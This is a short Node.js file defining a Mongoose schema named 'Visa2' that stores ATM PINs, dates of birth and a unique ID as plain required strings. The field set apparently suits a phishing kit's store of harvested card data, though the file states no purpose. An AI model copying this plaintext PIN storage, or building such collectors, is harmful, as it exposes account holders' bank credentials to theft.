const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
    atmPin: { type: String, required: true },
    dob: { type: String, required: true },
    uniqueid: { type: String, required: true, unique: true }
});

module.exports = mongoose.model('Visa2', userSchema);
